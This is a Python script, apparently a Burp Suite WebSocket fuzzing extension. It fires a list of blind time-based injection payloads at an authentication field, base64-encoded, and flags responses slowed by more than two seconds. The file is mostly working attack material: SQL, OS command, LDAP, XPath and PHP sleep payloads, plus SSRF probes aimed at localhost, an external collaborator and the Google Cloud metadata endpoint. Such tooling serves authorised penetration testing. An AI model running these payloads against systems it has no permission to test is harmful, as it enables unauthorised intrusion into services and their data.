import base64
import time

# Constants for the base64-wrapped JSON payload
START_PAYLOAD = '{"auth_user":"YWRtaW4=","auth_pass":"'
END_PAYLOAD = '"}'

# Comprehensive list of time-based injection payloads
SLEEP_PAYLOADS = [
    # 1 SQL Injection (MySQL, PostgreSQL, MSSQL, Oracle)
    "' OR SLEEP(1); -- a",  # MySQL
    "'; SELECT pg_sleep(1); -- a",  # PostgreSQL
    "'; WAITFOR DELAY '00:00:01'; -- a",  # MSSQL
    "' OR dbms_pipe.receive_message('SYS',1) FROM dual -- a",  # Oracle

    # 2 Command Injection (Linux & Windows)
    "; sleep 1",  # Linux
    "& sleep 1 &",  # Linux (background)
    "| sleep 1",  # Linux (pipe)
    "&& sleep 1",  # Linux (double command)
    "`sleep 1`",  # Linux (backticks)
    "$(sleep 1)",  # Linux (subshell)
    "; ping -c 3 127.0.0.1",  # Linux (ping delay)
    "& ping -n 3 127.0.0.1 &",  # Windows (ping delay)
    "|| timeout /t 1",  # Windows (timeout command)
    "|| Start-Sleep -s 1",  # Windows PowerShell

    # 3 LDAP Injection (Blind Injection Payloads)
    "*)(&(cn=*)(&(uid=*)(!(|(mail=*)(sleep=1)))))",  # LDAP filter bypass
    "*)(sleep=1))%00",  # LDAP attribute injection
    "(|(uid=admin)(!(uid=*))(|(mail=*)(sleep=1)))",  # LDAP or injection

    # 4 SSRF Time Delay Payloads
    "http://127.0.0.1:22/",  # Localhost SSRF delay
    "http://burpcollaborator.net/",  # External collaborator
    "http://localhost:80/",  # Web SSRF delay
    "http://metadata.google.internal/",  # Google Cloud SSRF

    # 5 XPath Injection (Blind XPath time delay)
    "' or count(//user[username='admin' and sleep(1)]) > 0",  # XPath Injection

    # 6 JavaScript Injection (Client-side Delay)
    "setTimeout(() => alert(1), 1000);",  # JS-based delay
    "window.setTimeout(()=>{console.log('delayed')}, 1000);",  # Console-based delay

    # 7 PHP Injection
    "' OR usleep(1000000); -- a",  # PHP usleep delay
    "' OR sleep(3); -- a",  # PHP sleep()
]

current_payload_index = 0  # Track which payload is being tested

def queue_websockets(upgrade_request, message):
    """
    Create a WebSocket connection and start testing the first payload.
    """
    global current_payload_index

    connection = websocket_connection.create(upgrade_request, Engine.BURP)
    send_payload(connection, current_payload_index)

def handle_outgoing_message(websocket_message, interesting):
    """
    Log outgoing messages for debugging or inspection.
    """
    results_table.add(websocket_message)

def handle_incoming_message(websocket_message, interesting):
    """
    1. Measures response time.
    2. If elapsed time > 2000ms, assume sleep condition was triggered.
    3. If no sleep is detected, move to the next payload.
    """

    global current_payload_index

    # Log/store the incoming message
    elapsed_time = websocket_message.getTime()

    print "Elapsed Time:", elapsed_time

    if elapsed_time > 2000:
        results_table.add(websocket_message)
        print "[+] Time Delay Detected! Possible vulnerability with:"
        print "    Payload:", SLEEP_PAYLOADS[current_payload_index]
        print "[+] Response:", websocket_message.getMessage()
    current_payload_index += 1
    if current_payload_index < len(SLEEP_PAYLOADS):
        connection = websocket_message.getConnection()
        send_payload(connection, current_payload_index)
    else:
        print "[!] Finished testing all payloads. No sleep detected."

def send_payload(connection, index):
    """
    Encodes and sends the next time-delay payload.
    """
    payload = SLEEP_PAYLOADS[index]
    encoded_payload = base64.b64encode(payload)
    connection.queue(START_PAYLOAD + encoded_payload + END_PAYLOAD)
